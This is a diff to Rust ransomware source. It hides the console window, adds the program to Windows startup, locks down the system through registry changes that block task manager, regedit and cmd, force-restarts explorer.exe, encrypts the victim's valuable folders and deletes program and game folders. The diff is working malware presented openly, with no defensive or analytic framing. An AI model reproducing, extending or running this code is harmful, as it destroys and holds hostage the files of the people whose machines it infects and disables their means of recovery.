@@ -1,4 +1,4 @@
-//#![windows_subsystem = "windows"] // hides execution console
+#![windows_subsystem = "windows"] // hides execution console
 mod encryption;
 mod smart_dir;
 mod system_changer;
@@ -27,21 +27,16 @@ use system_changer::registry_changer;
 use walkdir::WalkDir;
 
 fn main() {
-    // Registry changes to block windows features like task manager, regedit, cmd, change user and many others.
-    registry_changer::lock_down_system();
-
-    // Restart explorer.exe in order for registry changes to apply
-    Command::new("taskkill")
-        .arg("/f")
-        .arg("/im")
-        .arg("explorer.exe")
-        .spawn();
-    thread::sleep(time::Duration::from_secs(1));
-    Command::new("explorer.exe").spawn();
+    // Adds program to startup
+    registry_changer::start_ransomware_on_startup();
 
     // Gets the folders to be encrypted on all the mounted drives in order of importance.
     let mut folders_to_encrypt = Vec::new();
     dir_list::add_valuable_folder_paths_windows(&mut folders_to_encrypt);
+
+    // Gets the folders to be deleted (the ones with non sensitive information)
+    let mut unwanted_folders = vec![];
+    dir_list::add_non_valuable_folder_paths_windows(&mut unwanted_folders);
 
     // Creates an encryptor from strong generated keys.
     let mut key_gen = key_gen::KeyGen::from(Hc128Rng::from_entropy());
@@ -73,6 +68,12 @@ fn main() {
         },
         None => (),
     }
+
+    // Registry changes to block windows features like task manager, regedit, cmd, change user and many others.
+    registry_changer::lock_down_system();
+
+    // Restart explorer.exe in order for registry changes to apply
+    restart_explorer();
 
     // Second encrypts in the vector we got at the start.
     for path in folders_to_encrypt {
@@ -108,10 +109,15 @@ fn main() {
         Err(_) => (),
     }
 
-    // Forth deletes games folders and program folders.
-    let mut unwanted_folders = vec![];
-    dir_list::add_non_valuable_folder_paths_windows(&mut unwanted_folders);
+    // Forth deletes games folders and program folders. (basically folders that don't have sensitive information)
     encryptor.delete_files_in_dirs(&unwanted_folders);
+
+    // Restart explorer.exe in order to refresh the system for the deleted apps.
+    restart_explorer();
+
+    // HACK keeping window opened for debugging purposes.
+    //let mut buf = String::new();
+    //let std::io::stdin().read_line(&mut buf);
     /*
     for path in common_folder_paths {
         println!("{}", path);
@@ -146,4 +152,14 @@ fn main() {
     for disk in sys.disks() {
         println!("{:?}", disk);
     }*/
+}
+
+fn restart_explorer() {
+    Command::new("taskkill")
+        .arg("/f")
+        .arg("/im")
+        .arg("explorer.exe")
+        .spawn();
+    thread::sleep(time::Duration::from_secs(1));
+    Command::new("explorer.exe").spawn();
 }
